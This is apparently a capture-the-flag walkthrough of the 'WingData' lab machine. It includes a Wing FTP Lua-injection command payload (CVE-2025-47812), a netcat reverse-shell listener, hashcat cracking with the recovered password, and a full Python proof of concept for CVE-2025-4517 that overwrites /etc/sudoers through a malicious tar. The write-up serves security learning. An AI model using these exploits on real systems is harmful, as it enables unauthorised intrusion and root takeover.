# WINGDATA -- Linux

---
## Enumeration
---

#### NMAP


```
sudo nmap -Pn -sCV 10.129.244.106 --min-rate 6666 -vvv -oN tcp.nmap
```

//only ports 22 and 80 -- meaning we likely have to exploit the web

<img width="575" height="268" alt="image" src="https://github.com/user-attachments/assets/7dbdec2e-3533-46ee-b761-8235bf3da87d" />



---

#### FEROXBUSTER


```
feroxbuster -u http://wingdata.htb 
```

- nothing stands out
- then found `ftp` subdomain after clicking login


```
feroxbuster -u http://ftp.wingdata.htb -C 503 
```

//nothing stands out

<img width="580" height="97" alt="image" src="https://github.com/user-attachments/assets/68b9f1f4-7b2e-4363-aa9c-b6bceeaf2e30" />


---

#### FTP.WINGDATA.HTB

- there's version leaking on login page `Wing FTP Server v7.4.3`

<img width="530" height="474" alt="image" src="https://github.com/user-attachments/assets/1ea6b09a-31cf-4464-aeba-1dc2c31457ab" />


- google `wing ftp server 7.4.3 github`
- found `https://github.com/runZeroInc/nuclei-templates/blob/main/http/cves/2025/CVE-2025-47812.yaml`

<img width="1205" height="408" alt="image" src="https://github.com/user-attachments/assets/c7386135-2faa-454a-ae7e-ad3d83e94065" />


- potential payload `username=anonymous%00]]%0dlocal+h+%3d+io.popen("{{cmd}}")%0dlocal+r+%3d+h%3aread("*a")%0dh%3aclose()%0dprint(r)%0d--&password=`

<img width="1097" height="186" alt="image" src="https://github.com/user-attachments/assets/d09b8bf6-0eca-471a-8211-dcdc28c40216" />



---
## EXPLOITATION

---
#### BURP


- first fire up foxyproxy on browser -- to capture http traffic
- then login with anonymous:
- we can then see that loginok.html is the page with the POST request and the params -- where we can inject our payload

<img width="1251" height="677" alt="image" src="https://github.com/user-attachments/assets/829571d9-e3de-4ce1-8bed-0ab30d77fa09" />

- on repeater tab -- first try and inject `id` command
- then copy the new cookie

<img width="1250" height="336" alt="image" src="https://github.com/user-attachments/assets/69425cfe-a4f7-44df-81e8-833bb10fe1ac" />

- paste the cookie and send it
- we can see the `id` command successfully injected and executed

<img width="1250" height="339" alt="image" src="https://github.com/user-attachments/assets/fce7ea5e-caa9-4658-9c4e-6eeec9bfe961" />

- now rinse and repeat but with our bash reverse shell
- also fire up our nc

```
rlwrap -cAr nc -lnvp 8888
```

<img width="1250" height="349" alt="image" src="https://github.com/user-attachments/assets/56e07e3d-866d-4914-ae4f-3bcec404dd86" />

- it hangs

<img width="1074" height="292" alt="image" src="https://github.com/user-attachments/assets/d44edc4f-9b1a-465b-af36-31993529679e" />

- and we got our reverse shell
- there's user wacky

<img width="1005" height="229" alt="image" src="https://github.com/user-attachments/assets/2fa51a2b-3943-4d7d-aa1c-3ccb5360957e" />




---
## PRIVESC

---
#### WACKY USER

- enumerate and found potential passwords for a bunch of users -- but will focus on user wacky

<img width="703" height="141" alt="image" src="https://github.com/user-attachments/assets/90bcec1a-9b2c-4254-8aa4-b6eecbb615f3" />

- there's also salt `WingFTP`

<img width="531" height="85" alt="image" src="https://github.com/user-attachments/assets/d0098a54-ca07-4c1b-a653-23e2daab64dd" />


- check wingFTP documentation and there's the format for salt


<img width="1230" height="147" alt="image" src="https://github.com/user-attachments/assets/0496c5c0-1241-43e5-bf3c-cf9637c58b75" />



---
#### HASHCAT

<img width="570" height="59" alt="image" src="https://github.com/user-attachments/assets/08eb1ded-2da1-4849-94d8-7979e2d09bc2" />


```
hashcat -m 1410 hash /usr/share/wordlists/rockyou.txt --user
```

//it cracks it -- `!#7Blushing^*Bride5`


<img width="574" height="142" alt="image" src="https://github.com/user-attachments/assets/68ee2b0a-ab07-499c-ad8c-f9287359e203" />



//finally got user


<img width="470" height="133" alt="image" src="https://github.com/user-attachments/assets/a921d204-f889-4414-acd0-0676944845c0" />


//we could also ssh in with the password


---
#### TO ROOT


```
sudo -l
```

<img width="608" height="176" alt="image" src="https://github.com/user-attachments/assets/dc08cbfc-a8f4-4e74-a059-c00c3841134f" />


- essentially this script creates backup files with tar
- looked through it and there's no clear way to abuse anything in the script
- one thing to note -- python3 is not in /usr/bin -- suggesting it could be locally compiled

```
cat /opt/backup_clients/restore_backup_clients.py
```

```
#!/usr/bin/env python3
import tarfile
import os
import sys
import re
import argparse

BACKUP_BASE_DIR = "/opt/backup_clients/backups"
STAGING_BASE = "/opt/backup_clients/restored_backups"

def validate_backup_name(filename):
    if not re.fullmatch(r"^backup_\d+\.tar$", filename):
        return False
    client_id = filename.split('_')[1].rstrip('.tar')
    return client_id.isdigit() and client_id != "0"

def validate_restore_tag(tag):
    return bool(re.fullmatch(r"^[a-zA-Z0-9_]{1,24}$", tag))

def main():
    parser = argparse.ArgumentParser(
        description="Restore client configuration from a validated backup tarball.",
        epilog="Example: sudo %(prog)s -b backup_1001.tar -r restore_john"
    )
    parser.add_argument(
        "-b", "--backup",
        required=True,
        help="Backup filename (must be in /home/wacky/backup_clients/ and match backup_<client_id>.tar, "
             "where <client_id> is a positive integer, e.g., backup_1001.tar)"
    )
    parser.add_argument(
        "-r", "--restore-dir",
        required=True,
        help="Staging directory name for the restore operation. "
             "Must follow the format: restore_<client_user> (e.g., restore_john). "
             "Only alphanumeric characters and underscores are allowed in the <client_user> part (1–24 characters)."
    )

    args = parser.parse_args()

    if not validate_backup_name(args.backup):
        print("[!] Invalid backup name. Expected format: backup_<client_id>.tar (e.g., backup_1001.tar)", file=sys.stderr)
        sys.exit(1)

    backup_path = os.path.join(BACKUP_BASE_DIR, args.backup)
    if not os.path.isfile(backup_path):
        print(f"[!] Backup file not found: {backup_path}", file=sys.stderr)
        sys.exit(1)

    if not args.restore_dir.startswith("restore_"):
        print("[!] --restore-dir must start with 'restore_'", file=sys.stderr)
        sys.exit(1)

    tag = args.restore_dir[8:]
    if not tag:
        print("[!] --restore-dir must include a non-empty tag after 'restore_'", file=sys.stderr)
        sys.exit(1)

    if not validate_restore_tag(tag):
        print("[!] Restore tag must be 1–24 characters long and contain only letters, digits, or underscores", file=sys.stderr)
        sys.exit(1)

    staging_dir = os.path.join(STAGING_BASE, args.restore_dir)
    print(f"[+] Backup: {args.backup}")
    print(f"[+] Staging directory: {staging_dir}")

    os.makedirs(staging_dir, exist_ok=True)

    try:
        with tarfile.open(backup_path, "r") as tar:
            tar.extractall(path=staging_dir, filter="data")
        print(f"[+] Extraction completed in {staging_dir}")
    except (tarfile.TarError, OSError, Exception) as e:
        print(f"[!] Error during extraction: {e}", file=sys.stderr)
        sys.exit(2)

if __name__ == "__main__":
    main()

```


//if we try and run it

```
/usr/local/bin/python3 /opt/backup_clients/restore_backup_clients.py
```

<img width="807" height="64" alt="image" src="https://github.com/user-attachments/assets/b09b20e0-669a-4e7c-bf02-dbbe546719ca" />



//check python version


<img width="690" height="117" alt="image" src="https://github.com/user-attachments/assets/d8e82151-94cc-46ea-8f96-3b40511a3f13" />



---
#### CVE-2025-4517


- google `python 3.12 tar poc`
- found https://github.com/StealthByte0/CVE-2025-4517-poc


<img width="712" height="667" alt="image" src="https://github.com/user-attachments/assets/4878c412-0996-49b6-9ead-23aa07994866" />


**CREDIT TO STELTHBYTE0

```
import tarfile
import os
import io
import sys

# Create a long directory name (247 'd' characters) that will be used many times
# This helps force path length issues and makes the traversal cleaner in some tar implementations
comp = 'd' * 247

# Sequence of single-letter directory names we'll create (a → p)
# We need many nested directories to make the relative path long enough later
steps = "abcdefghijklmnop"

# Current "working" path inside the tar (starts empty)
path = ""

# ───────────────────────────────────────────────
# Phase 1: Create deep nested directory structure + symlink loop
# ───────────────────────────────────────────────
with tarfile.open("evil_backup_cve_2025_4517.tar", mode="w") as tar:
    for i in steps:
        # 1. Create a very long-named directory (d repeated 247 times)
        a = tarfile.TarInfo(os.path.join(path, comp))
        a.type = tarfile.DIRTYPE
        tar.addfile(a)

        # 2. Immediately create a symlink with the SAME name as the next letter (a,b,c,...)
        #    that points back to the long-named directory we just created
        #    → this creates a symlink loop: b → ddddd..., c → ddddd..., etc.
        b = tarfile.TarInfo(os.path.join(path, i))
        b.type = tarfile.SYMTYPE
        b.linkname = comp                      # points to ../path/dddd... (long name)
        tar.addfile(b)

        # Move "current path" one level deeper (now inside the long-named dir)
        path = os.path.join(path, comp)

    # ───────────────────────────────────────────────
    # Phase 2: Create long symlink chain that goes very high up
    # ───────────────────────────────────────────────
    # Build path like: a/d{247}/b/d{247}/c/d{247}/.../p/d{247}/l{254}
    linkpath = os.path.join("/".join(steps), "l" * 254)

    # This symlink will point many levels up (we'll use it to escape later)
    l = tarfile.TarInfo(linkpath)
    l.type = tarfile.SYMTYPE
    # Go up once for each original directory we created (a through p = 16 levels)
    l.linkname = "../" * len(steps)
    tar.addfile(l)

    # ───────────────────────────────────────────────
    # Phase 3: Final escape symlink that reaches /etc
    # ───────────────────────────────────────────────
    # "escape" → long-chain-symlink → ../../../../../../../../etc
    e = tarfile.TarInfo("escape")
    e.type = tarfile.SYMTYPE
    e.linkname = linkpath + "/../../../../../../../etc"
    #                                   ^^^^^^^^^^^^^^^^^^^
    #                                   extra ../ to reach actual /etc
    tar.addfile(e)

    # ───────────────────────────────────────────────
    # Phase 4: Hardlink trick (most important part!)
    # ───────────────────────────────────────────────
    # We first create a **hard link** entry pointing to "escape/sudoers"
    # → this tells tar: "whatever file ends up at this name should share the same inode"
    f = tarfile.TarInfo("sudoers_link")
    f.type = tarfile.LNKTYPE
    f.linkname = "escape/sudoers"           # ← points into our escaped path
    tar.addfile(f)

    # ───────────────────────────────────────────────
    # Phase 5: Write actual content → goes to the hard-linked inode
    # ───────────────────────────────────────────────
    # Same name as previous hard link entry!
    # Because it's a regular file with content → tar will write the content
    # to the inode that is already linked from "escape/sudoers"
    #change foy you user
    content = b"demouser ALL=(ALL) NOPASSWD: ALL\n"
    c = tarfile.TarInfo("sudoers_link")
    c.type = tarfile.REGTYPE
    c.size = len(content)
    tar.addfile(c, fileobj=io.BytesIO(content))

    # After extraction the victim usually sees:
    #   sudoers_link        ← normal file with our payload
    #   escape/sudoers      ← hardlinked to the same inode → /etc/sudoers gets overwritten

```



//change user name to `wacky`

<img width="518" height="189" alt="image" src="https://github.com/user-attachments/assets/6efdf4ae-2dd1-4c42-8d9e-9644203e1f97" />


```
scp CVE-2025-4517.py wacky@10.129.46.29:/tmp 
```

//get our poc onto target

<img width="495" height="74" alt="image" src="https://github.com/user-attachments/assets/fd2827ab-e0c6-46aa-9350-fe9e2ecdaf2c" />


1. first run the poc to generate malicious tar file
```
python3 CVE-2025-4517.py
```


2. rename the tar file to correspond to the sudo script requirement -- and move it to /opt/backup_clients/backups/
```
mv evil_backup_cve_2025_4517.tar backup_888.tar
```


3. now run the sudo command to execute our poc -- make sure our restore dir -r begins with `restore_`

```
sudo /usr/local/bin/python3 /opt/backup_clients/restore_backup_clients.py -b backup_888.tar -r restore_e8ht
```

4. run `sudo -l` again to see if the poc works -- and indeed it does



<img width="585" height="617" alt="image" src="https://github.com/user-attachments/assets/8b9cf7e1-ec36-45ef-9b15-d77b77942ea5" />


```
sudo su
```

//and we're done

<img width="317" height="38" alt="image" src="https://github.com/user-attachments/assets/02659aa9-026c-4761-b2f2-7000732771b2" />





